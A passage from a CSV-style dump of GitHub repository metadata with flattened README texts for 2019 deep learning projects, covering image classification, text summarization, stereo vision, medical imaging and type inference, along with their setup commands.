3 Backprop formating problem solved 4 VAE Multi initialization evaluation Single output Withouth the Loss 2019 08 26 Bug Fixed Function added 1 VAE evaluation module connect with the forward model prediction which gives the loss 2 Tandem Model geo2spec module bug fix tested 3 Tandem Model spec2geo module bug fix tested 4 Diversity Quality Measure formulation 5 Time record system for time analysis 5 Bug fixed for inadequate test cases 6 Geometry Possible Space plotting module added not tested yet 2019 08 27 Bug Fixed Function added Work Done 1 Plot both possible solution space and the original space 2 3 Model Inference time comparison Plots 3 Heatmap auto dropping duplicated coloumn and choose the best performace model to plot 4 Bug fix of reading parameter from current flag while doing evaluation auto grab from metafile now 5 2019 08 28 Function added Work Done 1 Diversity metric formulation 2 Diversity metric heat map demonstration 3 VAE evaluation works now however the loss is still very high 2019 08 29 2019 09 02 Cerus broke doing repairs Function added Work Done 1 Tandem param running all geo space plotted 2 VAE solution space plotted 3 PPT slides done 2019 09 03 Things to do 1 Implement both diversity measurement and compare the 3 algorithms The blue area method and the Minimum spanning tree method 2 Training time comparison 3 VAE further tuning Loss too high now 4 Investigate the mystery tradeoff between forward model accuracy and Tandem accuracy 5 Think about the Toy DataSet thing where we can control the one to manyness Working on now Finishing today Pending to work HUGE BUG DETECTED SOLVE BELOW POINTS NOW WELL SEGMENTATION FAULT COMING FROM HIGH CONCURENCY IS REALLY A PAIN STILL NOT SOLVING IT Cool you ve fixed all bugs found congrats All possible heights 30 32 34 36 38 40 42 5 44 46 48 50 52 55 All possible radius 42 42 8 43 7 44 5 45 3 46 2 47 47 8 48 6 49 5 50 4 51 2 52 h0 h1 h2 h3 r0 r1 r2 r3,2019-08-08T19:12:06Z,2019-11-23T18:53:20Z,Python,BensonRen,User,1,1,1,134,master,BensonRen,1,0,0,1,0,0,0
cagrigungor,Multiple-Face-Recognition-with-Keras,n/a,Multiple Face Recognition with Keras It is an individual project that aims recognize the faces of my father and me Test https user images githubusercontent com 54181614 65838221 8d849d00 e309 11e9 8ebd 3c545788d72e jpg faceDataset py Taking pictures of the user by using OpenCV By the use of haarcascade features the pictures only include human faces,2019-08-22T19:12:39Z,2019-10-11T14:28:49Z,Python,cagrigungor,User,0,1,0,4,master,cagrigungor,1,0,0,0,0,0,0
DrSnowbird,text-summary-docker,page-rank#text-summarization,https images microbadger com badges image openkbs text summary docker svg https microbadger com images openkbs text summary docker Get your own image badge on microbadger com https images microbadger com badges version openkbs text summary docker svg https microbadger com images openkbs text summary docker Get your own version badge on microbadger com Text Summary Docker Components openjdk version 1 8 0222 Apache Maven 3 6 0 Python 3 6 Python 2 7 pip 19 1 Python3 virtual environments venv virtualenv virtualenvwrapper mkvirtualenv etc Node v11 15 0 npm 6 7 0 from NodeSource official Node Distribution Gradle 5 3 Pre loaded various Text Summarizier algorithms PageRank Bert Text Summarizer Tf IDF approach to add more later using virtualenv for each algorithm Other tools git wget unzip vim python python setuptools python dev python numpy Pre loaded Text Summarizer algorithms bert extractive summarizer bert text summary pypi py data bert text summary pypi txt README md requirements txt run try bert text summary pypi py log simple TFIDF data bert text summary pypi txt data wiki txt fb txt requirements txt text summarization simple TFIDF py text summary with PageRank data bert text summary pypi txt README md requirements txt run text summary with PageRank log text summary with PageRank py Prepare Source Data Files Each data file needs to be only one line If multiple lines please use the bin strip newline sh utility to join all sentences into one line Then put the data file to current directory s data foler The summarizer main program will scan all the data files in data folder and generate summary output to HOME data docker text summary docker workspace folder Run Interactive Mode run sh bin bash or docker compose up Once you are inside the container you can try cd HOME python3 python text summary with PageRank textpython3 python text summary with PageRank text summary with PageRank py d data fb txt python3 python text summary with PageRank textpython3 python text summary with PageRank text summary with PageRank py d data msft txt Run Batch Mode as command line run sh python3 home developer python mainpython py d home developer data msft txt or docker run rm it name text summary docker openkbs text summary docker python3 home developer python mainpython py d home developer data msft txt See Also docker based IDE openkbs docker spark bde2020 zeppelin https cloud docker com u openkbs repository docker openkbs docker spark bde2020 zeppelin Spark Scala Java Cluster with Spark ML MLlib Hadoop HDFS openkbs atom docker https hub docker com r openkbs atom docker openkbs eclipse oxygen docker https hub docker com r openkbs eclipse oxygen docker openkbs eclipse photon docker https hub docker com r openkbs eclipse photon docker openkbs eclipse photon vnc docker https hub docker com r openkbs eclipse photon vnc docker openkbs intellj docker https hub docker com r openkbs intellij docker openkbs intellj vnc docker https hub docker com r openkbs intellij vnc docker openkbs knime docker https hub docker com r openkbs knime docker openkbs knime vnc docker https hub docker com r openkbs knime vnc docker openkbs netbeans10 docker https hub docker com r openkbs netbeans10 docker openkbs netbeans https hub docker com r openkbs netbeans openkbs papyrus sysml docker https hub docker com r openkbs papyrus sysml docker openkbs pycharm docker https hub docker com r openkbs pycharm docker openkbs rapidminer docker https cloud docker com u openkbs repository docker openkbs rapidminer docker openkbs scala ide docker https hub docker com r openkbs scala ide docker openkbs sublime docker https hub docker com r openkbs sublime docker openkbs webstorm docker https hub docker com r openkbs webstorm docker openkbs webstorm vnc docker https hub docker com r openkbs webstorm vnc docker Python Packages List import sys sys executable m pip list Package Version absl py 0 7 1 astor 0 7 1 atomicwrites 1 3 0 attrs 19 1 0 backcall 0 1 0 beautifulsoup4 4 4 1 bleach 3 1 0 boto 2 49 0 boto3 1 9 130 botocore 1 12 130 bz2file 0 98 certifi 2019 3 9 chardet 3 0 4 Click 7 0 cycler 0 10 0 decorator 4 4 0 defusedxml 0 5 0 docutils 0 14 entrypoints 0 3 findspark 1 3 0 Flask 1 0 2 funcy 1 11 future 0 17 1 gast 0 2 2 gensim 3 7 2 grpcio 1 19 0 h5py 2 9 0 html5lib 0 999 httpie 1 0 2 hyperopt 0 1 2 idna 2 8 ipaddress 1 0 22 ipykernel 5 1 0 ipython 7 4 0 ipython genutils 0 2 0 ipywidgets 7 4 2 itsdangerous 1 1 0 j2cli 0 3 6 post1 jedi 0 13 3 Jinja2 2 10 1 jmespath 0 9 4 joblib 0 13 2 jsonschema 3 0 1 jupyter 1 0 0 jupyter client 5 2 4 jupyter console 6 0 0 jupyter core 4 4 0 Keras 2 2 4 Keras Applications 1 0 7 Keras Preprocessing 1 0 9 kiwisolver 1 0 1 langdetect 1 0 7 lxml 3 5 0 Markdown 3 1 MarkupSafe 1 1 1 matplotlib 3 0 3 mistune 0 8 4 mock 2 0 0 more itertools 7 0 0 nbconvert 5 4 1 nbformat 4 4 0 networkx 2 3 nltk 3 4 notebook 5 7 8 numexpr 2 6 9 numpy 1 16 2 panda 0 3 1 pandas 0 24 2 pandasql 0 7 3 pandocfilters 1 4 2 parso 0 4 0 pathlib2 2 3 3 pbr 5 1 3 pexpect 4 7 0 pickleshare 0 7 5 Pillow 6 0 0 pip 19 0 3 pkgconfig 1 5 1 pluggy 0 9 0 prometheus client 0 6 0 prompt toolkit 2 0 9 protobuf 3 7 1 ptyprocess 0 6 0 py 1 8 0 py4j 0 10 7 pycurl 7 43 0 Pygments 2 3 1 pygobject 3 20 0 pyLDAvis 2 1 2 pymongo 3 7 2 pyparsing 2 3 1 pyrsistent 0 14 11 pyspark 2 4 1 pytest 4 4 0 python apt 1 1 0b1 ubuntu0 16 4 2 python dateutil 2 8 0 pytz 2018 9 PyYAML 5 1 pyzmq 18 0 1 qtconsole 4 4 3 requests 2 21 0 s3transfer 0 2 0 scikit learn 0 20 3 scipy 1 2 1 seaborn 0 9 0 Send2Trash 1 5 0 setuptools 41 0 0 singledispatch 3 4 0 3 six 1 12 0 smart open 1 8 1 SQLAlchemy 1 3 2 stevedore 1 30 1 tables 3 2 2 tensorboard 1 13 1 tensorflow 1 13 1 tensorflow estimator 1 13 0 termcolor 1 1 0 terminado 0 8 2 testpath 0 4 2 tornado 6 0 2 tqdm 4 31 1 traitlets 4 3 2 unattended upgrades 0 1 urllib3 1 24 1 virtualenv 16 4 3 virtualenv clone 0 5 2 virtualenvwrapper 4 8 4 wcwidth 0 1 7 webencodings 0 5 1 Werkzeug 0 15 2 wheel 0 33 1 widgetsnbextension 3 4 2 Releases Information developer 2368ba1413d1 usr scripts printVersions sh echo JAVAHOME usr lib jvm java 8 openjdk amd64 JAVAHOME usr lib jvm java 8 openjdk amd64 java version openjdk version 1 8 0212 OpenJDK Runtime Environment build 1 8 0212 8u212 b01 1 deb9u1 b01 OpenJDK 64 Bit Server VM build 25 212 b01 mixed mode mvn version Apache Maven 3 6 0 97c98ec64a1fdfee7767ce5ffb20918da4f719f3 2018 10 24T18 41 47Z Maven home usr apache maven 3 6 0 Java version 1 8 0212 vendor Oracle Corporation runtime usr lib jvm java 8 openjdk amd64 jre Default locale en platform encoding UTF 8 OS name linux version 4 18 0 25 generic arch amd64 family unix python V Python 2 7 13 python3 V Python 3 5 3 pip version pip 19 1 from usr local lib python3 5 dist packages pip python 3 5 pip3 version pip 19 1 from usr local lib python3 5 dist packages pip python 3 5 gradle version Welcome to Gradle 5 3 1 Here are the highlights of this release Feature variants AKA optional dependencies Type safe accessors in Kotlin precompiled script plugins Gradle Module Metadata 1 0 For more details see https docs gradle org 5 3 1 release notes html Gradle 5 3 1 Build time 2019 03 28 09 09 23 UTC Revision f2fae6ba563cfb772c8bc35d31e43c59a5b620c3 Kotlin 1 3 21 Groovy 2 5 4 Ant Apache Ant TM version 1 9 13 compiled on July 10 2018 JVM 1 8 0212 Oracle Corporation 25 212 b01 OS Linux 4 18 0 25 generic amd64 npm v 6 7 0 node v v11 14 0 cat etc os release PRETTYNAME Debian GNU Linux 9 stretch NAME Debian GNU Linux VERSIONID 9 VERSION 9 stretch ID debian HOMEURL https www debian org SUPPORTURL https www debian org support BUGREPORTURL https bugs debian org,2019-08-13T04:40:40Z,2019-09-14T12:22:17Z,Shell,DrSnowbird,User,1,1,0,1,master,DrSnowbird,1,0,0,0,0,0,0
DoubangoTelecom,ultimateMICR-SDK,n/a,Insanely fast and accurate 99 8 MICR E 13B CMC 7 detectors and recognizers using deep learning Automating Bank account information extraction from MICR Magnetic ink character recognition zones on scanned checks document above human level accuracy is a very challenging task Our implementation reaches such level of accuracy using latest deep learning techniques We outperforms both ABBYY and LEADTOLS in terms of accuracy and speed almost 30 times faster Using a single model we re able to accurately locate the MICR zones infer the type E 13B or CMC 7 and recognize the fields one shot deep model The performance gap between us and the other companies is more important for CMC 7 format which is more challenging than E13B This technology is a key component of Remote Deposit Capture applications using mobile phones or scanners Online demo Don t take our word for it test it using your own images at https www doubango org webapps micr Source code Source code coming soon and The Computer vision part is open source https github com DoubangoTelecom CompV The Deep learning part is closed source for now https github com DoubangoTelecom ultimateMICR,2019-09-12T11:25:41Z,2019-12-06T13:30:48Z,n/a,DoubangoTelecom,User,2,1,0,3,master,DoubangoTelecom,1,0,0,0,0,0,0
idiWork,Experiment_102,n/a,Experiment 102 Hotel Customer Reviews Classification Using Cognitive Services and Deep Learning for Hotel Customer Reviews Classification Project Date August September 2019 Services Azure Notebooks Azure Machine Learning Keras Neural Network Azure Cognitive Services Microsoft Flow Technology used Machine Learning About The Experiment 102 researches about the possibilities of applying Cognitive Services and Deep Learning to understand and manage a huge amount of information from human interactions without the human intervention We will discover if the Artificial Intelligence is capable of collect all this raw data classify it and manage all the different situations Idea The project tries to simulate an automatic classification of comments or reviews in a business environment Any company wants to identify critical requests as soon as possible to try to solve it before them become a big problem regardless of the number of messages that arrive or the language in which them were wrote or the time that them were sent Utility For this simulation it is been chosen the case of an hotel We will imagine that the customers have access to a mobile application in which they can leave their comments complaints and suggestions They can use images to illustrate their point of view or location and text messages to explain it Due to content the reviews will be classified as good neutral or bad In this case we want to classify each comment and identify the bad urgent and important ones to manage them quickly and if it were necessary report to a different human agent depends of the location room bar restaurant swimming pool etc who will can solve it properly Process First we are going to create an Azure Notebooks project where we can set up a Notebook server Then we will create and upload some files based on Python to deploy a Text Summarization service in an Azure Machine Learning Workspace After that we will construct and train a simple deep neural network classification model with Keras and Tensorflow that will classify the hotel customers reviews Also we will perform the integration with the Azure Cognitive Services along with the Azure Machine Learning We will use Computer Vision API to collect information from pictures or photographs and Text Analytics API to extract data from human utterances Advantages The principal advantage of using Cognitive Services and Deep Learning in this case is the possibility of identifying very quickly the reviews or comments that needs to be carefully manage by a human been because of its importance or its urgency Even if tons and tons of messages arrive we can be sure that the most critical messages will be identified and treated immediately and the rest of them will be classified and stored correctly This way a company will save money and resources and will be very much efficient attending customers requests Links Experiment Hotel Customer Reviews Classification https www idiwork com projects experiment 102 Architecture Diagram Services and Resources https www idiwork com experiment 102 architectural diagram Step by Step 1 How to create an Azure Notebooks project https www idiwork com experiment 102 how to create an azure notebooks project and deploy a summarization service Step by Step 2 How to construct a Deep Neural Network https www idiwork com experiment 102 how to construct and train a deep neural network using keras and deploy the model as an azure web service Step by Step 3 How to deploy Azure Cognitive Services https www idiwork com experiment 102 how to deploy and integrate azure cognitive services computer vision and text analytics Step by Step 4 How to use Microsoft Flow to send alerts https www idiwork com experiment 102 how to use microsoft flow to send an email when an event occurs,2019-09-09T08:49:37Z,2019-12-11T10:33:48Z,Jupyter Notebook,idiWork,Organization,1,1,0,12,master,SergioVelmay,1,0,0,0,0,0,0
nesl,neuromask,n/a,neuromask Implementation of NeuroMask Explaining Predictions of Deep Neural Networks through Mask Learning https ieeexplore ieee org abstract document 8784063 Install requirments pip install r requirements txt ImageNet model experiment Download the pre trained model weights of inception v3 model bash downloadinceptionv3checkpoint sh Run the demo notebook NeuroMaskDemoImageNet ipynb NeuroMaskDemoImageNet ipynb to see an example of how to generate explanations of inception v3 model classifications Example output CIFAR 10 example outputexamples inceptionresult png CIFAR 10 experiment Download the pre trained model weights of the CIFAR 10 classification model bash downloadcifar10model sh Run the neuromask to get explanation of the CIFAR 10 model Use the testidx parameter to provide an index of a test example from the CIFAR 10 test dataset python neuromaskcifar10demo py testidx xx Example output CIFAR 10 example outputexamples cifar10example17 png Maintainer This project is maintained by Moustafa Alzantot malzantot https github com malzantot,2019-08-26T20:29:43Z,2019-09-05T22:53:34Z,Jupyter Notebook,nesl,Organization,7,1,0,3,master,malzantot,1,0,0,0,0,0,0
artsiom-sinitski,Sentiment-Analysis-Model,n/a,Sentiment Analysis Model Determine mood of a short text tweet review etc using Convolutional Neural Network Table of Contents Installation installation Features features Contributing contributing Team team FAQ faq Support support License license Installation Install Python 3 7 Install the following Python packages Keras DL high level framework Tensorflow DL backend pandas data manipulation scikit learn model crossvalidation matplotlib data visualization Clone Clone this repo to your local machine using https github com artsiom sinitski Sentiment Analysis Model git Features Usage First prepare the data for the model In the command line type python prepData py Second train the model by running from the command line python trainModel py default 7 32 default is the name of your model 120 is the number of epochs for training 1 is number of batches Third make the model predict by running from the command line python predictTextMood py default 7 32 OR to make the model read tweets from Tweetssamples txt file type in cat data Tweetssamples txt python predictTextMood py default 7 32 Team Artsiom Sinitski Artsiom Sinitski https github com artsiom sinitski https github com artsiom sinitski github com artsiom sinitski FAQ Support Reach out to me at the following places GitHub account Instagram account License License http img shields io license mit blue svg style flat square http badges mit license org MIT license http opensource org licenses mit license php Copyright 2019,2019-08-29T08:34:57Z,2019-09-05T06:54:29Z,Python,artsiom-sinitski,User,1,1,0,15,master,artsiom-sinitski,1,0,0,0,0,0,0
USTC-HIlab,Semi-HIC,n/a,Semi HIC Semi HIC A novel semi supervised deep learning framework for histopathological image classification Lei Su from Health Informatics Lab School of Information Science and Technology University of Science and Technology of China Requirement tenserflow 1 8 0 numpy 1 14 5 Related data need to first load The dataset of the Bioimaging challenge 2015 dataset can be download from https rdm inesctec pt dataset nis 2017 003 and the IDC dataset can be download from http www andrewjanowczyk com use case 6 invasive ductal carcinoma idc segmentation Train with your own data If you want to train your own network you can change the corresponding parameters in train py to choose to use the model Contact Please feel free to contact us if you need any help sulei123 mail ustc edu cn,2019-08-16T11:13:02Z,2019-08-31T11:33:15Z,Python,USTC-HIlab,User,1,1,0,8,master,USTC-HIlab#sulei95,2,0,0,0,0,0,0
tlkvstepan,event_stereo_ICCV2019,n/a,Learning an event sequence embedding for dense event based deep stereo Description Asynchronous event sequences require special handling since traditional algorithms work only with synchronous spatially gridded data To address this problem we introduce a new module for event sequence embedding for use in different applications The module builds a representation of an event sequence by firstly aggregating information locally across time using a novel fully connected layer for an irregularly sampled continuous domain and then across discrete spatial domain Based on this module we design a deep learning based stereo method for event based cameras The proposed method is the first learning based stereo method for an event based camera and the only method that produces dense results We show large performance increases on the Multi Vehicle Stereo Event Camera Dataset MVSEC Please cite our ICCV2019 paper https www idiap ch fleuret papers tulyakov et al iccv2019 pdf if you use this repository as inproceedingstulyakov et al 2019 author Tulyakov S and Fleuret F and Kiefel M and Gehler P and Hirsch M title Learning an event sequence embedding for event based deep stereo booktitle Proceedings of the IEEE International Conference on Computer Vision ICCV year 2019 type Oral note To appear url https fleuret org papers tulyakov et al iccv2019 pdf Prepare dataset Please install conda https www anaconda com download Then create new conda environment with python2 7 and all dependencies by running conda config append channels conda forge conda create name convertmvsec file tools requirements txt yes python 2 7 Next install cvbridge rosbag and rospy packages from Robot Operating System ROS http wiki ros org indigo Installation Ubuntu by following instructions on the web site Next clone third party dependency The Multi Vehicle Stereo Event Camera Dataset An Event Camera Dataset for 3D Perception by Zhu A Z Thakur D Ozaslan T Pfrommer B Kumar V and Daniilidis K https daniilidis group github io mvsec into thirdparty folder by running git clone https github com daniilidis group mvsec thirdparty mvsec and create software links in tools folder for all python scripts in thirdparty mvsec gtflow This is required since one of module conflicts with one of the standard ROS modules and the conflict can not be resolved without modification of the third party code Finally download and convert indoorflying 1 2 3 4 experiments by running conda activate convertmvsec tools convertmvsec py dataset experiment indoorflying 1 tools convertmvsec py dataset experiment indoorflying 2 tools convertmvsec py dataset experiment indoorflying 3 Install Please install conda https www anaconda com download Next create new conda environment with python3 6 and all dependencies including pytorch https pytorch org by running conda config append channels pytorch conda create name densedeepeventstereo file requirements txt yes python 3 6 Then install the package by running conda activate densedeepeventstereo python setup py develop Next install third party dependency Practical Deep Stereo PDS Toward application friendly deep stereo matching by Tulyakov S Ivanov A and Fleuret F https github com tlkvstepan PracticalDeepStereoNIPS2018 git by running conda activate densedeepeventstereo git clone https github com tlkvstepan PracticalDeepStereoNIPS2018 git thirdparty PracticalDeepStereoNIPS2018 cd thirdparty PracticalDeepStereoNIPS2018 python setup py develop Run experiments All networks from the paper can be trained and tested using runexperiment py script For example to train the network with a continuous fully connected temporal aggregation on split 1 please run conda activate densedeepeventstereo runexperiment py experiments traincontinuousfullyconnected datasetfolder dataset temporalaggregationtype continuousfullyconnected splitnumber 1 The results of the training with training log plot and results for a validation set then can be found in experiments traincontinuousfullyconnected folder Next to test the network from checkpoint experiments traincontinuousfullyconnected 009checkpoint bin please run conda activate densedeepeventstereo runexperiment py experiments testcontinuousfullyconnected datasetfolder dataset checkpointfile experiments traincontinuousfullyconnected 009checkpoint bin temporalaggregationtype continuousfullyconnected splitnumber 1 testmode Troubleshooting Please run all unit tests to localilze potential bugs by executing runtests sh,2019-08-16T14:16:56Z,2019-10-18T06:57:31Z,Python,tlkvstepan,User,1,1,0,2,master,tlkvstepan,1,0,0,0,0,0,0
esperancaleonardo,dqn_pyrep_lia,n/a,dqnpyreplia Deep Reinforcement Learning implementation using PyRep API https github com stepjam PyRep for V Rep Simulator Harder Better FASTER Stronger WIP running some parameters testing First Things First Follow Pyrep instructions and make sure the pyrep Python lib is working Please check Run py to see the argparse to check how to run the code Here are just some of them python parser addargument ep metavar int type int help Number of episodes to be executed default DEFAULTEPISODES parser addargument steps metavar int type int help Number of steps to each episode default DEFAULTSTEPS parser addargument epochs metavar int type int help Epochs for each model fit call default DEFAULTEPOCHS parser addargument epsilon metavar float type float help Random policy factor required True parser addargument replaysize metavar int type int help Maximum batch size for the replay fase required True parser addargument memorysize metavar int type int help Memory length for the agent required True parser addargument model metavar string type str help Model type required True parser addargument notrender help Render False or not True the environment action storetrue default False parser addargument debug help Debug or not action storetrue default False Feel free to add and test new models Email me or open an issue if have any doubts,2019-09-17T03:43:33Z,2019-11-12T00:47:09Z,Python,esperancaleonardo,User,2,1,0,83,master,esperancaleonardo,1,0,0,0,0,0,0
Abhiswain97,CheXNet,n/a,CheXNet PyTorch implementation of CheXNet Radiologist level pneumonia detection using deep learning https arxiv org abs 1711 05225 based on this https github com arnoweng CheXNet implementation Extract all the images to the images folder Running model py 1 To train the model do python model py 2 To test the model comment the train code and uncomment the test code and run model py,2019-08-12T17:43:30Z,2019-12-09T06:50:05Z,Python,Abhiswain97,User,1,1,0,9,master,Abhiswain97,1,0,0,0,0,0,0
WenYang2019,MSc-Project,n/a,MSc Project Self Attention Augmented Deep Learning for High Frequency Stock Price Trend Prediction,2019-09-02T10:12:33Z,2019-09-30T05:14:19Z,Jupyter Notebook,WenYang2019,User,1,1,0,11,master,WenYang2019,1,0,0,0,0,0,0
casperboone,dltpy,deep-learning#python#typeinference,DLTPy Deep Learning Type Inference of Python Function Signatures using their Natural Language Context DLTPy makes type predictions based on comments on the semantic elements of the function name and argument names and on the semantic elements of identifiers in the return expressions Using the natural language of these different elements we have trained a classifier that predicts types We use a recurrent neural network RNN with a Long Short Term Memory LSTM architecture Read our paper paper pdf for the full details Components DLTPy flow https user images githubusercontent com 15815208 67791371 98049480 fa77 11e9 95ed bb94e7b06eeb png preprocessing Preprocessing Pipeline a d Downloads projects extracts comments and typesm and gives a csv file per project containing all functions Start using bash python preprocessing pipeline py Optional arguments h help show this help message and exit projectsfile PROJECTSFILE json file containing GitHub projects limit LIMIT limit the number of projects for which the pipeline should run jobs JOBS number of jobs to use for pipeline outputdir OUTPUTDIR output dir for the pipeline start START start position within projects list input preparation Input Preparation e f input preparation generatedf py can be used to combine all the separate csv files per project into one big file while applying filtering input preparation dftovec py can be used to convert this generated csv to vectors input preparation embedder py can be used to train word embeddings for input preparation dftovec py learning Learning g The different RNN models we evaluated can be found in learning learn py Testing bash pytest Credits Casper Boone https github com casperboone Niels de Bruin https github com nielsdebruin Arjan Langerak https github com alangerak Fabian Stelmach https github com fabianstelmach All contributors contributors License The MIT License MIT Please see the license file LICENSE for more information,2019-09-19T13:30:46Z,2019-10-29T21:33:20Z,Jupyter Notebook,casperboone,User,3,1,1,144,master,casperboone#nielsdebruin#alangerak#Fabianstelmach#www,5,0,0,1,0,1,25
yantiz,UNet-Retinal-Vessel-Segmentation,computer-vision#deep-learning,U Net Retinal Vessel Segmentation In a nutshell the purpose of our project is to train a classifier that can classify pixels from retinal fundus images into one of the three categories including artery vein or background with high accuracy In this way the automation of retinal vessel segmentation process can be achieved and oculists may hopefully be relieved from the labor intensive task of drawing out the vessels by hand Thanks for Orobix s source code https github com orobix retina unet Raw Test Images test alloriginals png Ground Truth Test Images test allgroundTruths png Predictions for Test Images test allpredictionshard png Precision Recall Curves for Individual Classes test Precisionrecallmulticlass png,2019-08-19T23:25:14Z,2019-08-21T21:50:27Z,Jupyter Notebook,yantiz,User,1,1,1,2,master,yantiz,1,0,0,0,0,0,0
edaaydinea,python_projects,n/a,Python Projects by studying different sources Machine Learning Deep learning Data Science This file is included python projects which I studied until now These codes are written by using machine learning and deep learning techniques,2019-08-13T09:19:24Z,2019-11-23T07:48:15Z,Python,edaaydinea,User,1,1,0,18,master,edaaydinea,1,0,0,0,0,0,0
yunusulucay,Apache-Spark-on-Colab,n/a,Apache Spark on Colab Hello there I have created a work on Colab for myself on the basic level of Apache Spark If you want to learn Apache Spark Apache Spark SQL or if you want to know how to work with Apache Spark on Colab it will be useful for you You can download ipynb file and after open the colab you can upload it,2019-08-29T20:41:14Z,2019-09-15T00:09:17Z,Jupyter Notebook,yunusulucay,User,1,1,0,11,master,yunusulucay,1,0,0,0,0,0,0
Czzzzzzzz,toy_recommendation_system,n/a,,2019-09-11T07:18:21Z,2019-11-27T08:17:39Z,Jupyter Notebook,Czzzzzzzz,User,1,1,0,2,master,Czzzzzzzz,1,0,0,0,0,0,0
Abhig18,Titanic-Learning-from-the-sinking-ship,n/a,Titanic Learning from the sinking ship Using data analysis the following points were explored 1 Who were the passengers on the Titanic Ages Gender Class etc 2 What deck were the passengers on and how does that relate to their class 3 Where did the passengers come from 4 Who was alone and who was with family Then we ll dig deeper with a broader question 5 What factors helped someone survive the sinking,2019-09-10T16:38:15Z,2019-10-11T07:51:27Z,Jupyter Notebook,Abhig18,User,1,1,0,3,master,Abhig18,1,0,0,0,0,0,0
rainzy09,study_about_word_Segmentation,n/a,,2019-08-18T13:40:47Z,2019-09-08T10:04:25Z,n/a,rainzy09,User,1,1,0,7,master,rainzy09,1,0,0,0,0,0,0
mfekadu,jeans,deep-learning#evolution#genetic-algorithm#group-selection#python#simulation,jeans An exploration of multi level selection 0 group selection by simulation with a genetic algorithm and deep learning in Python The goal of this repository is to better understand this weird concept known as group selection by programming an evolutionary simulation with groups that are in competition with each other and the members of each group can choose to cooperate with their groupmates or not Hopefully altruism will emerge but I am also unsure of the fundamental parts of biology that I misunderstand So that s another goal to learn what I don t know about biology by blindly simulating a small piece of it Find more technical details in issue 1 7 Inspirational Readings Lectures Sapiens 1 by Yuval Noah Harari particularly chapter 2 The Righteous Mind 2 by Jonathan Haidt particularly chapter 9 3 and this lecture 4 Up and Down the Ladder of Abstraction 6 by Bret Victor Lecture 22 Emergence and Complexity 8 by Professor Robert Sapolsky Tools Pymunk physics engine Pyglet game visualization library Numpy multi dimentional math library Keras deep learning library Running The Simulation Make a Python virtual environment python3 m venv venv Run the virtual environment source venv bin activate Install all of the requirements pip install r requirements txt Enter the matrix 5 python3 sim py 0 https en wikipedia org wiki Groupselection Multilevelselectiontheory 1 https en wikipedia org wiki Sapiens ABriefHistoryofHumankind 2 https en wikipedia org wiki TheRighteousMind 3 https www righteousmind com wp content uploads 2012 08 RighteousMind Chapter 9 pdf 4 https youtu be NQ192d4c4S0 5 https en wikipedia org wiki TheMatrix 6 http worrydream com LadderOfAbstraction 7 https github com mfekadu jeans issues 1 8 https youtu be oZuWbX CyE,2019-08-27T19:47:57Z,2019-10-18T22:56:56Z,Python,mfekadu,User,1,1,0,77,master,mfekadu,1,0,0,2,0,1,0
XiaoYunChaos,nodule_object_detection_system,n/a,noduleobjectdetectionsystem This is a pulmonary nodule detection system based on a deep learning neural network developed using the Flask framework,2019-08-11T14:00:36Z,2019-09-22T09:12:29Z,Python,XiaoYunChaos,User,1,1,0,5,master,XiaoYunChaos,1,0,0,0,0,0,0
rshwndsz,emotion-recognition,arduino#ecg#latex#python#raspberry-pi-3#signal-processing,Emotion Recognition Read the report docs reports firstreport pdf Emotions play a critical role in the evolution of consciousness and the operations of all mental processes The different types of emotions have been shown to be related to various levels of consciousness Positive emotions help improve human health and work efficiency while negative emotions may cause health problems Experiences of negative emotions are inevitable and at times useful Even so when extreme prolonged or contextually inappropriate negative emotions can trigger a wide array of problems for individuals and for society Fear and anxiety for instance fuel phobias and other anxiety disorders and together with acute and chronic stress may compromise immune functioning and create susceptibilities to stress related physical disorders For some individuals sadness and grief may swell into unipolar depression which when severe can lead to immunosuppression loss of work productivity and suicide Anger and its poor management have been implicated in the etiology of heart disease and some cancers as well as in aggression and violence especially in boys and men Emotion recognition helps to qualitatively and quantitavely understand emotions providing tools to aid the cure of a lot of mental diseases and disorders In general emotion recognition methods can be classified into two major categories The first is using human physical signals such as facial expression speech gesture posture etc which has the advantage of easy collection and has been studied for years However their reliability cannot be guaranteed as its relatively easy for people to control physical signals like facial expressions or speech to hide their real emotions especially during social communications The other category is using internal signals i e the physiological signals which include the electroencephalogram EEG temperature T electrocardiogram ECG electromyogram EMG galvanic skin response GSR respiration RSP Physiological signals are generated in response to the Central Nervous System CNS and the Autonomic Nervous System ANS of human body in which emotion changes according to Cannons theory One of the major benefits of the latter method is that the CNS and the ANS are largely involuntarily activated and therefore cannot be easily controlled,2019-08-10T03:47:39Z,2019-11-13T05:36:18Z,Jupyter Notebook,rshwndsz,User,0,1,1,142,master,rshwndsz#sathvikyesprabhu,2,0,0,0,0,0,14
Baichenjia,mc-dropout,n/a,mnist mc dropout Description Writing Python Tensorflow eager execution code for representing model uncertainty in deep learning Based on the following Dropout as a Bayesian Approximation Representing Model Uncertainty in Deep Learning https arxiv org abs 1506 02142 Dropout as a Bayesian Approximation Appendix https arxiv org abs 1506 02157 Training run python mnist py The training process is defined in mnist py after training 1 epoch the weight will save as weight h5 Uncertain run python uncertain py The model uncertainty is calculated in uncerrtain py Each test image uses 500 stochastic forward propagations of neural networks In each forward propagation we calculate the final logits of neural network and take argmax to get the output class The ratio of different output classes in 500 runs is calculated and we plot a figure for each test image Uncertain Results some avatar mc 0 jpg avatar mc 6 jpg avatar mc 13 jpg avatar mc 18 jpg avatar mc 19 jpg avatar mc 33 jpg avatar mc 47 jpg avatar mc 48 jpg,2019-08-23T01:07:39Z,2019-08-23T01:10:38Z,Python,Baichenjia,User,1,1,0,1,master,Baichenjia,1,0,0,0,0,0,0
edupooch,cxr-domain-shift,n/a,CXR domain shift This repository provides the code for reproducing the experiments of our paper Can we trust deep learning models diagnosis The impact of domain shift in chest radiograph classification https arxiv org abs 1909 01940 Data The data used in this repository comes from three different datasets NIH ChestX ray14 https arxiv org abs 1705 02315 CheXpert https arxiv org abs 1901 07031 and MIMIC CXR https arxiv org abs 1901 07042 The three datasets are publicly available We provide pre trained models on all three datasets If you want to retrain the models you need to download the datasets from their sources Experiments We train three models one for each dataset and subsequently evaluate our model at the other two Each model is trained with the training set and evaluated at the other two test sets The three datasets have the same train test and validation sets in all experiments Inside each dataset s directory there is a directory with the model trained on it along with a checkpoint and training log Also the results obtained by the model on the test set of each of the three datasets Inside the results directory there is the prediction score for the each sample of the test set and AUCs for each disease common between the train and test set To retrain a model see retrain py and to re evaluate a trained model see reeval py Acknowledgments Special thanks to jrzech https github com jrzech for his code reproducing CheXnet in Pytorch in which we based our experiments Original code available on GitHub https github com jrzech reproduce 